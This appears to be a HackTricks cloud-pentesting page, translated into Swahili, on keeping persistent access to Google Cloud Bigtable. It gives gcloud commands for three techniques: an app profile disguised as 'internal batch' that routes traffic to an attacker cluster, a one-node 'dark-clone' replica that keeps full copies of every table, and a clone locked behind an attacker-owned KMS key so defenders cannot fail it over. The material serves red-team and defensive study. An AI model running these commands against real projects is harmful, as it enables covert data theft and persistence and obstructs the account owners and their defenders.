# GCP - Bigtable Uendelevu

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Kwa maelezo zaidi kuhusu Bigtable angalia:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### App Profile iliyotengwa kwa mshambuliaji

**Ruhusa:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Tengeneza app profile inayolekeza trafiki kwenye replica cluster yako na wezesha Data Boost ili usitegemee nodi zilizotengwa ambazo watetezi wanaweza kugundua.

<details>

<summary>Tengeneza app profile ya kificho</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Iwapo wasifu hili litaendelea kuwepo, unaweza kuungana tena kwa kutumia credentials mpya zinazomrejea kwake.

### Dumisha cluster yako ya nakala

**Ruhusa:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Toa cluster yenye idadi ndogo ya node katika eneo tulivu. Hata kama vitambulisho vya wateja wako vitaondoka, **cluster itaweka nakala kamili ya kila jedwali** hadi watetezi waiondoe waziwazi.

<details>

<summary>Create replica cluster</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Ufuatilie kupitia `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` ili uweze ku-scale up mara moja unaponahitaji kuvuta data.

### Lock replication behind your own CMEK

**Permissions:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` kwa attacker-owned key.

Leta KMS key yako unapo spin up clone. Bila key hiyo, Google haiwezi ku-re-create au ku-fail over cluster, hivyo blue teams lazima washirikiane nawe kabla ya kuigusa.

<details>

<summary>Unda cluster iliyolindwa na CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Zungusha au zima key katika project yako ili mara moja kufanya replica isiyoweza kutumika (lakini bado ukawa na uwezo wa kuiwasha tena baadaye).

{{#include ../../../banners/hacktricks-training.md}}
